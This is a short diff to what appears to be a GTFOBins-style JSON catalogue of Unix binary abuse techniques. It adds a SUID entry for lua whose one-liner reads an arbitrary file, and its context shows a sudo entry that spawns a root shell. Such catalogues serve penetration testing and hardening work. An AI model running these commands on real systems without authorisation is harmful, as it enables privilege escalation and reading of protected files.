@@ -39,6 +39,11 @@
         "code": "lua -e 'local f=io.open(\"[file]\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
       }
     ],
+      "suid": [
+      {
+        "code": "lua -e 'local f=io.open(\"[file]\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
+      }
+    ],
     "sudo": [
       {
         "code": "sudo lua -e 'os.execute(\"/bin/sh\")'"
